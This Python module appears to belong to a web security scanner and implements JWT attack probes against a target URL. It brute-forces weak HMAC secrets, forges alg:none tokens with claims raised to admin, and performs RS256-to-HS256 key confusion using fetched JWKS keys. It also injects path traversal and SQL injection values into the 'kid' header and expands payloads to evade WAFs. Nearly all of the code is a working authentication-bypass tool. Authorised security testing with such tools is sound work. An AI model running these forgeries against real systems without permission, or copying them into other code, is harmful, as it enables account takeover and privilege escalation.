"""JWT probes: weak HMAC secrets, alg:none, RS256→HS256 confusion, kid injection."""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import warnings

import httpx
import jwt

from shroodler.authz_diff import headers_from_auth_line
from shroodler.models import Finding
from shroodler.pacer import Pacer
from shroodler.probes.common import body_text, dedupe, request
from shroodler.urls import origin as origin_of
from shroodler.waf_detect import expand_if_waf

_JWT_RE = re.compile(r"[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+")
_WEAK_SECRETS = ("secret", "password", "changeit", "webgoat", "", "HS256")
_DENIED = {401, 403}
_JWKS_PATHS = ("/jwks.json", "/.well-known/jwks.json", "/api/auth/keys")
_KID_TRAVERSAL = "../../dev/null"
_KID_SQL = "' UNION SELECT 'secret'--"


def _find_jwts(*blobs: str) -> list[str]:
    seen: set[str] = set()
    out: list[str] = []
    for blob in blobs:
        for match in _JWT_RE.finditer(blob or ""):
            token = match.group(0)
            if token.count(".") != 2 or token in seen:
                continue
            seen.add(token)
            out.append(token)
    return out


def _headers_with_token(
    cookie_header: str,
    auth_header: str,
    original: str,
    replacement: str,
) -> dict[str, str]:
    headers = headers_from_auth_line(cookie_header)
    if auth_header:
        headers.update(headers_from_auth_line(auth_header))
    if not headers:
        headers = {"Authorization": f"Bearer {replacement}"}
        return headers
    return {key: value.replace(original, replacement) for key, value in headers.items()}


def _resign(token: str, secret: str) -> str | None:
    try:
        header = jwt.get_unverified_header(token)
        payload = jwt.decode(token, options={"verify_signature": False})
    except Exception:  # noqa: BLE001 - malformed token
        return None
    headers = {k: v for k, v in header.items() if k != "alg"}
    try:
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")
            return jwt.encode(payload, secret, algorithm="HS256", headers=headers or None)
    except Exception:  # noqa: BLE001 - empty/unsupported key
        return None


def _unverified(token: str) -> tuple[dict, dict] | None:
    try:
        header = jwt.get_unverified_header(token)
        payload = jwt.decode(token, options={"verify_signature": False})
    except Exception:  # noqa: BLE001 - malformed token
        return None
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return None
    return header, payload


def _b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode("ascii")


def _b64url_json(obj: dict) -> str:
    return _b64url(json.dumps(obj, separators=(",", ":")).encode("utf-8"))


def _forge_alg_none(payload: dict, alg: str = "none") -> str:
    header = {"alg": alg, "typ": "JWT"}
    return f"{_b64url_json(header)}.{_b64url_json(payload)}."


def _hs256_sign(payload: dict, secret: bytes, extra_headers: dict | None = None) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    if extra_headers:
        header.update(extra_headers)
        header["alg"] = "HS256"
    h = _b64url_json(header)
    p = _b64url_json(payload)
    mac = hmac.new(secret, f"{h}.{p}".encode("ascii"), hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url(mac)}"


def _elevate_payload(payload: dict) -> dict:
    out = dict(payload)
    if "role" in out:
        out["role"] = "admin"
    if "sub" in out:
        out["sub"] = "admin"
    if "role" not in out and "sub" not in out:
        out["role"] = "admin"
    return out


def _json_obj(text: str) -> dict | None:
    try:
        data = json.loads(text)
    except (json.JSONDecodeError, TypeError, ValueError):
        return None
    return data if isinstance(data, dict) else None


def _access_elevated(original: httpx.Response | None, forged: httpx.Response | None) -> bool:
    if forged is None:
        return False
    forged_status = int(getattr(forged, "status_code", 0) or 0)
    orig_status = int(getattr(original, "status_code", 0) or 0)
    if forged_status == 200 and orig_status in _DENIED:
        return True
    if forged_status != 200:
        return False
    orig_body = body_text(original)
    forged_body = body_text(forged)
    if not forged_body or orig_body == forged_body:
        return False
    orig_json = _json_obj(orig_body)
    forged_json = _json_obj(forged_body)
    if orig_json is not None and forged_json is not None:
        if set(forged_json) - set(orig_json):
            return True
        return orig_json != forged_json
    return orig_body != forged_body


def _replay(
    url: str,
    cookie_header: str,
    auth_header: str,
    original: str,
    replacement: str,
    *,
    client: httpx.Client | None,
    pacer: Pacer | None,
) -> httpx.Response | None:
    return request(
        "GET",
        url,
        extra_headers=_headers_with_token(cookie_header, auth_header, original, replacement),
        client=client,
        pacer=pacer,
    )


def _jwk_to_pem(jwk: dict) -> bytes | None:
    try:
        from cryptography.hazmat.primitives import serialization
        from jwt.algorithms import RSAAlgorithm

        key = RSAAlgorithm.from_jwk(jwk)
        return key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        )
    except Exception:  # noqa: BLE001 - fail closed if no usable key
        return None


def _key_to_secret(raw) -> bytes | None:
    if isinstance(raw, (bytes, bytearray)):
        return bytes(raw) or None
    if isinstance(raw, str):
        text = raw.strip()
        if text.startswith("-----BEGIN"):
            return text.encode("utf-8")
        try:
            raw = json.loads(text)
        except (json.JSONDecodeError, TypeError, ValueError):
            return text.encode("utf-8") if text else None
    if isinstance(raw, dict):
        for field in ("pem", "key", "publicKey", "public_key"):
            val = raw.get(field)
            if isinstance(val, str) and "BEGIN" in val:
                return val.encode("utf-8")
        return _jwk_to_pem(raw)
    return None


def _parse_key_docs(text: str) -> list:
    stripped = (text or "").strip()
    if not stripped:
        return []
    if stripped.startswith("-----BEGIN"):
        return [stripped]
    try:
        data = json.loads(stripped)
    except (json.JSONDecodeError, TypeError, ValueError):
        return []
    if isinstance(data, list):
        return list(data)
    if not isinstance(data, dict):
        return []
    keys = data.get("keys")
    if isinstance(keys, list):
        return list(keys)
    return [data]


def _fetch_hmac_secret_from_jwks(
    url: str,
    cookie_header: str,
    auth_header: str,
    *,
    client: httpx.Client | None,
    pacer: Pacer | None,
) -> bytes | None:
    try:
        base = origin_of(url).rstrip("/")
    except Exception:  # noqa: BLE001
        return None
    extra = headers_from_auth_line(auth_header) if auth_header else None
    for path in _JWKS_PATHS:
        resp = request(
            "GET",
            base + path,
            cookie_header=cookie_header,
            extra_headers=extra,
            client=client,
            pacer=pacer,
        )
        if resp is None or int(getattr(resp, "status_code", 0) or 0) != 200:
            continue
        for item in _parse_key_docs(body_text(resp)):
            secret = _key_to_secret(item)
            if secret:
                return secret
    return None


def _finding(url: str, finding_id: str, description: str, evidence: str) -> Finding:
    return Finding(
        id=finding_id,
        severity="critical",
        category="secret",
        url=url,
        description=description,
        evidence=evidence,
        confidence="confirmed",
    )


def probe_jwt(
    url: str,
    cookie_header: str,
    auth_header: str = "",
    *,
    client: httpx.Client | None = None,
    pacer: Pacer | None = None,
    state=None,
    waf_detected: bool = False,
    waf_vendor: str | None = None,
) -> list[Finding]:
    """Re-sign captured JWTs with weak HS256 secrets and replay them."""
    tokens = _find_jwts(cookie_header, auth_header)
    if not tokens:
        return []

    findings: list[Finding] = []
    for token in tokens:
        garbage = ".".join((*token.split(".")[:2], "garbage-signature-not-valid"))
        denied = request(
            "GET",
            url,
            extra_headers=_headers_with_token(cookie_header, auth_header, token, garbage),
            client=client,
            pacer=pacer,
        )
        garbage_status = int(getattr(denied, "status_code", 0) or 0)
        original = _replay(
            url,
            cookie_header,
            auth_header,
            token,
            token,
            client=client,
            pacer=pacer,
        )
        if garbage_status in _DENIED:
            secrets_to_try = expand_if_waf(
                _WEAK_SECRETS,
                state=state,
                waf_detected=waf_detected,
                waf_vendor=waf_vendor,
            )
            for secret in secrets_to_try:
                try:
                    forged = _resign(token, secret)
                except Exception:  # noqa: BLE001 - mutated secret must not crash
                    continue
                if not forged:
                    continue
                resp = request(
                    "GET",
                    url,
                    extra_headers=_headers_with_token(cookie_header, auth_header, token, forged),
                    client=client,
                    pacer=pacer,
                )
                if resp is None or int(resp.status_code) != 200:
                    continue
                findings.append(
                    Finding(
                        id="jwt-weak-secret",
                        severity="critical",
                        category="secret",
                        url=url,
                        description=(
                            "Server accepted a JWT re-signed with a well-known HS256 "
                            "secret while a garbage signature was denied."
                        ),
                        evidence=f"secret={secret}",
                        confidence="confirmed",
                    )
                )
                break

        parsed = _unverified(token)
        if parsed is None:
            continue
        header, payload = parsed

        none_algs = expand_if_waf(
            ("none",),
            state=state,
            waf_detected=waf_detected,
            waf_vendor=waf_vendor,
        )
        for alg in none_algs:
            try:
                none_token = _forge_alg_none(_elevate_payload(payload), alg=alg)
            except Exception:  # noqa: BLE001 - mutated alg must not crash
                continue
            none_resp = _replay(
                url,
                cookie_header,
                auth_header,
                token,
                none_token,
                client=client,
                pacer=pacer,
            )
            if _access_elevated(original, none_resp):
                findings.append(
                    _finding(
                        url,
                        "jwt-alg-none",
                        "Server accepted a forged alg=none JWT with elevated claims.",
                        f"alg={alg}",
                    )
                )
                break

        if str(header.get("alg") or "").upper() == "RS256":
            secret = _fetch_hmac_secret_from_jwks(
                url,
                cookie_header,
                auth_header,
                client=client,
                pacer=pacer,
            )
            if secret:
                try:
                    confused = _hs256_sign(payload, secret)
                except Exception:  # noqa: BLE001
                    confused = None
                if confused:
                    confused_resp = _replay(
                        url,
                        cookie_header,
                        auth_header,
                        token,
                        confused,
                        client=client,
                        pacer=pacer,
                    )
                    accepted = (
                        garbage_status in _DENIED
                        and confused_resp is not None
                        and int(confused_resp.status_code) == 200
                    ) or _access_elevated(original, confused_resp)
                    if accepted:
                        findings.append(
                            _finding(
                                url,
                                "jwt-algorithm-confusion",
                                "Server accepted an RS256 JWT re-signed as HS256 "
                                "with the published public key as the HMAC secret.",
                                "alg=HS256 key=jwks",
                            )
                        )

        kid = header.get("kid")
        if isinstance(kid, str) and kid:
            kid_attempts = (
                (_KID_TRAVERSAL, b""),
                (_KID_SQL, b"secret"),
            )
            kid_hit = False
            for kid_value, kid_secret in kid_attempts:
                variants = expand_if_waf(
                    (kid_value,),
                    state=state,
                    waf_detected=waf_detected,
                    waf_vendor=waf_vendor,
                )
                for mutated_kid in variants:
                    try:
                        forged = _hs256_sign(payload, kid_secret, {"kid": mutated_kid})
                    except Exception:  # noqa: BLE001
                        continue
                    resp = _replay(
                        url,
                        cookie_header,
                        auth_header,
                        token,
                        forged,
                        client=client,
                        pacer=pacer,
                    )
                    accepted = (
                        garbage_status in _DENIED
                        and resp is not None
                        and int(resp.status_code) == 200
                    ) or _access_elevated(original, resp)
                    if not accepted:
                        continue
                    findings.append(
                        _finding(
                            url,
                            "jwt-kid-injection",
                            "Server accepted a JWT whose kid was rewritten and "
                            "re-signed with a derived HMAC secret.",
                            f"kid={mutated_kid!r}",
                        )
                    )
                    kid_hit = True
                    break
                if kid_hit:
                    break

    return dedupe(findings)
